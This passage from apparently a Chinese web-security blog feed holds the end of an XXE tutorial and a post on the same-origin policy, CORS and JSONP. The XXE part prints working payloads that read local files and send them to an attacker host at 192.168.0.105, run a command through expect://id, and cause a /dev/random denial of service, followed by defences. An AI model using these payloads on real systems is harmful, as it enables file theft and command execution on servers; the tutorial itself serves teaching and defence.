&lt;span class=&#34;nv&#34;&gt;$dom&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DOMDocument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$dom&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;loadXML&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$xmlfile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LIBXML_NOENT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LIBXML_DTDLOAD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;payload：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE foo [
&amp;lt;!ELEMENT foo ANY&amp;gt;
&amp;lt;!ENTITY % file SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=file:///usr/haha&amp;quot;&amp;gt;
&amp;lt;!ENTITY % xxe SYSTEM &amp;quot;http://192.168.0.106/dtd.dtd&amp;quot;&amp;gt;
%xxe;
%all;
]&amp;gt;
&amp;lt;foo&amp;gt;&amp;amp;send;&amp;lt;/foo&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;dtd.dtd:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
&amp;lt;!ENTITY % all &amp;quot;&amp;lt;!ENTITY send SYSTEM &#39;http://192.168.0.105/haha.php?p=%file;&#39;&amp;gt;&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;带出结果：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 2331; 
			flex-basis: 5596px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xxe/image-20220127105847562.png&#34; data-size=&#34;513x22&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xxe/image-20220127105847562.png&#34;
			width=&#34;513&#34;
			height=&#34;22&#34;
			srcset=&#34;https://coollllllll.github.io/p/xxe/image-20220127105847562_hu56bc3dab79c05ef6f0a4f9e30d363580_3182_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xxe/image-20220127105847562_hu56bc3dab79c05ef6f0a4f9e30d363580_3182_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在dtd.dtd文件中不直接定义send实体去发送请求是因为这样做file实体参数是无法解析的，因此需要外加一层all参数实体声明，当参数实体all引用时才会解析file实体&lt;/li&gt;
&lt;li&gt;当带出大文件时会报错，估计是在URI长度有限制**(this is a question)**&lt;/li&gt;
&lt;li&gt;file实体解析后的文件内容实际是不纯净的，一般末尾会跟有&lt;code&gt;0x0a&lt;/code&gt;(如下图)，所以放到直接放到URL里会报非法url的错，所以可以使用伪协议编码后进行外带&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 1489; 
			flex-basis: 3574px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/xxe/image-20220127112028088.png&#34; data-size=&#34;566x38&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/xxe/image-20220127112028088.png&#34;
			width=&#34;566&#34;
			height=&#34;38&#34;
			srcset=&#34;https://coollllllll.github.io/p/xxe/image-20220127112028088_hu614add63711fa1c655f99da1e89e8f06_4612_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/xxe/image-20220127112028088_hu614add63711fa1c655f99da1e89e8f06_4612_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;然而，有时候无法引入外部实体(因为防火墙等原因)，同样也是无回显场景，这时可以尝试引入系统自带的一些dtd文件，实现重新定义一些参数实体从而外带数据&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;linux：&lt;code&gt;/usr/share/yelp/dtd/docbookx.dtd&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;windows:&lt;code&gt;C:\Windows\System32\wbem\xml&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE message [
    &amp;lt;!ENTITY % remote SYSTEM &amp;quot;/usr/share/yelp/dtd/docbookx.dtd&amp;quot;&amp;gt;
    &amp;lt;!ENTITY % file SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=file:///usr/haha&amp;quot;&amp;gt;
    &amp;lt;!ENTITY % ISOamso &#39;
        &amp;lt;!ENTITY &amp;amp;#x25; eval &amp;quot;&amp;lt;!ENTITY &amp;amp;#x26;#x25; send SYSTEM &amp;amp;#x27;http://192.168.0.105/?&amp;amp;#x25;file;&amp;amp;#x27;&amp;gt;&amp;quot;&amp;gt;
        &amp;amp;#x25;eval;
        &amp;amp;#x25;send;
    &#39;&amp;gt; 
    %remote;
]&amp;gt;
&amp;lt;message&amp;gt;1314&amp;lt;/message&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;执行命令&#34;&gt;执行命令&lt;/h3&gt;
&lt;p&gt;当PHP中安装expect扩展时可用。&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-xml-dtd&#34; data-lang=&#34;xml-dtd&#34;&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE xxe [
&amp;lt;!ELEMENT name ANY &amp;gt;
&amp;lt;!ENTITY xxe SYSTEM &amp;quot;expect://id&amp;quot;&amp;gt;]&amp;gt;
&amp;lt;xxe&amp;gt;
  &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt;
&amp;lt;/xxe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;dos攻击&#34;&gt;DoS攻击&lt;/h3&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
&amp;lt;!DOCTYPE xxe [
&amp;lt;!ELEMENT name ANY &amp;gt;
&amp;lt;!ENTITY xxe SYSTEM &amp;quot;file:///dev/random&amp;quot;&amp;gt;]&amp;gt;
&amp;lt;xxe&amp;gt;
  &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt;
&amp;lt;/xxe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;/dev/random:提供永不为空的随机字节数据流&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;防御方法&#34;&gt;防御方法&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用对应开发语言提供的禁用DTD、禁用外部实体和参数实体等方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PHP&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;libxml_disable_entity_loader(true);
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;Java&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 禁用DTDs (doctypes)
dbf.setFeature(&amp;quot;http://apache.org/xml/features/disallow-doctype-decl&amp;quot;, true);

// 如果不能禁用DTDs,设置以下两项(同时存在)
dbf.setFeature(&amp;quot;http://xml.org/sax/features/external-general-entities&amp;quot;, false);      //防止外部实体
dbf.setFeature(&amp;quot;http://xml.org/sax/features/external-parameter-entities&amp;quot;, false);   //防止参数实体
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;过滤关键字&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>同源策略</title>
        <link>https://coollllllll.github.io/p/web-1/</link>
        <pubDate>Fri, 09 Oct 2020 00:00:00 +0000</pubDate>
        
        <guid>https://coollllllll.github.io/p/web-1/</guid>
        <description>&lt;img src="https://coollllllll.github.io/p/web-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 同源策略" /&gt;&lt;h1 id=&#34;同源策略&#34;&gt;同源策略&lt;/h1&gt;
&lt;h2 id=&#34;同源定义&#34;&gt;同源定义&lt;/h2&gt;
&lt;p&gt;要素：协议、域名、端口&lt;/p&gt;
&lt;p&gt;如果两个url的协议、域名和端口相同，那么这两个url同源，否则不同源。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;URL&lt;/th&gt;
&lt;th&gt;是否同源&lt;/th&gt;
&lt;th&gt;原因&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;http://test.com/haha/1.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://test.com/haha/1.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;参照&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;https://test.com/2.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://test.com/2.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;不同源&lt;/td&gt;
&lt;td&gt;协议不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;http://test.com:8000/haha/3.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://test.com:8000/haha/3.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;不同源&lt;/td&gt;
&lt;td&gt;端口不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;http://testtest.com/haha/4.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://testtest.com/haha/4.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;不同源&lt;/td&gt;
&lt;td&gt;主机不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;http://test.com/xixi/5.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://test.com/xixi/5.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;同源&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;http://test.com/haha/6.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://test.com/haha/6.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;同源&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;注：域名和ip即使对应，也算不同源&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;同源策略-1&#34;&gt;同源策略&lt;/h2&gt;
&lt;p&gt;同源策略（Same Origin Policy）是一种约定，它是浏览器最核心也最基本的安全功能。它限制来自一个源的文档如何与不同源的资源进行交互。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 276; 
			flex-basis: 663px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-1/image-20220123102025225.png&#34; data-size=&#34;520x188&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-1/image-20220123102025225.png&#34;
			width=&#34;520&#34;
			height=&#34;188&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-1/image-20220123102025225_huf308d42c9d3fe642253c121ac9fa63c3_45210_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-1/image-20220123102025225_huf308d42c9d3fe642253c121ac9fa63c3_45210_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;同源策略的目的就是防止恶意网站窃取数据。假如用户访问A网站，登录之后Cookie产生，随即访问B网站，如果没有同源策略限制，B网站的资源则可以读取A网站的Cookie，危害产生。&lt;/p&gt;
&lt;h2 id=&#34;限制范围&#34;&gt;限制范围&lt;/h2&gt;
&lt;p&gt;受策略限制的非同源行为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cookie、localStorage和IndexedDB无法读取&lt;/li&gt;
&lt;li&gt;DOM无法获得&lt;/li&gt;
&lt;li&gt;AJAX请求可发送但是客户端接收不到返回信息&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;同源策略允许跨域写(发出请求)，不允许跨域读(接收响应)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;跨域实现&#34;&gt;跨域实现&lt;/h2&gt;
&lt;h3 id=&#34;src属性的标签&#34;&gt;src属性的标签&lt;/h3&gt;
&lt;p&gt;在浏览器中，&lt;code&gt;&amp;lt;script&amp;gt;、&amp;lt;img&amp;gt;、&amp;lt;iframe&amp;gt;、&amp;lt;link&amp;gt;&lt;/code&gt;等标签都可以跨域加载资源，而不受同源策略的限制。这些带&lt;code&gt;src&lt;/code&gt;属性的标签每次加载时，实际上是由浏览器发起了一次 GET 请求。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：为了安全起见，浏览器不允许对以这种方式加载到的资源进行读写操作，而只能使用标签本身应当具备的能力(比如脚本执行、样式应用等等)。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;cors跨域资源共享&#34;&gt;CORS(跨域资源共享)&lt;/h3&gt;
&lt;p&gt;CORS允许浏览器向跨源服务器发出XMLHttpRequest请求，并且接收响应，克服了AJAX只能同源使用的限制。&lt;/p&gt;
&lt;p&gt;当发出XMLHttpRequest请求时，浏览器会自动在HTTP请求头中加入Origin字段，服务端识别该字段并判断此&amp;quot;源(origin)&amp;ldquo;是否是合法的，如果合法则允许跨域资源访问。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.a.com/test.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://www.a.com/test.html&lt;/a&gt; 网站发起跨域的 ⅩMLHttpRequest 请求，请求地址为http://www.b.com/test.php。&lt;/li&gt;
&lt;li&gt;请求头中加入Origin：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 583; 
			flex-basis: 1400px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-1/image-20220123111441722.png&#34; data-size=&#34;210x36&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-1/image-20220123111441722.png&#34;
			width=&#34;210&#34;
			height=&#34;36&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-1/image-20220123111441722_hu4816ddc66c938520b621acfe1b0cc924_5441_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-1/image-20220123111441722_hu4816ddc66c938520b621acfe1b0cc924_5441_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务端校验该Origin Header(Origin Header 可以用于防范 CSRF，它不像 Referer 那么容易被伪造或清空)，并设置响应头&lt;code&gt;Access-Control-Allow-Origin: *&lt;/code&gt;，返回该响应。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Origin: *&lt;/code&gt;意味着信任任何源的跨域请求(极其危险)，浏览器接收到该响应，认为允许跨域，便不做拦截，客户端的跨域请求通过。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 330; 
			flex-basis: 792px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/web-1/image-20220123111957396.png&#34; data-size=&#34;538x163&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/web-1/image-20220123111957396.png&#34;
			width=&#34;538&#34;
			height=&#34;163&#34;
			srcset=&#34;https://coollllllll.github.io/p/web-1/image-20220123111957396_huaf4dfc618ae968474be717f863a72364_20101_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/web-1/image-20220123111957396_huaf4dfc618ae968474be717f863a72364_20101_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;jsonp跨域&#34;&gt;JSONP跨域&lt;/h3&gt;
&lt;p&gt;JSONP原理：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;是可跨域的，而且在跨域脚本中可以通过传参直接回调当前客户端脚本定义的函数。&lt;/p&gt;
&lt;p&gt;例如Google的AJAX搜索接口：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;//添加&amp;lt;script&amp;gt;标签的方法
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;addScriptTag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
       &lt;span class=&#34;kd&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;script&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
       &lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;setAttribute&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;type&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
       &lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;src&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
       &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
   
   &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
       &lt;span class=&#34;c1&#34;&gt;//搜索apple，将自定义的回调函数名result传入callback参数中
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;       &lt;span class=&#34;nx&#34;&gt;addScriptTag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://ajax.googleapis.com/ajax/services/search/web?v=1.0&amp;amp;q=apple&amp;amp;callback=result&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
       
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
   &lt;span class=&#34;c1&#34;&gt;//自定义的回调函数result
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
       &lt;span class=&#34;c1&#34;&gt;//弹出&amp;#39;apple搜&amp;#39;索结果的第一条记录中url数据
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;       &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;responseData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;results&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unescapedUrl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;设置documentdomain&#34;&gt;设置document.domain&lt;/h3&gt;
&lt;p&gt;原理：&lt;/p&gt;
&lt;p&gt;让&lt;strong&gt;两个不同的子域&lt;/strong&gt;通过设置document.domain为同一个父域，借助iframe标签，实现两个子域的交互。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;// http://a.test.com/a.html：加载窗口，设置父域

&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;iframe&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;id &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;iframe&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://b.test.com/b.html&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onload &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;haha()&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;iframe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;domain&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;test.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//设置父域
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;haha&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
        &lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;￼iframe&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;contentWindow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;//contentWindows属性返回子窗口的 window 对象，以此获取内部的DOM
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;// http://b.test.com/b.html：设置父域

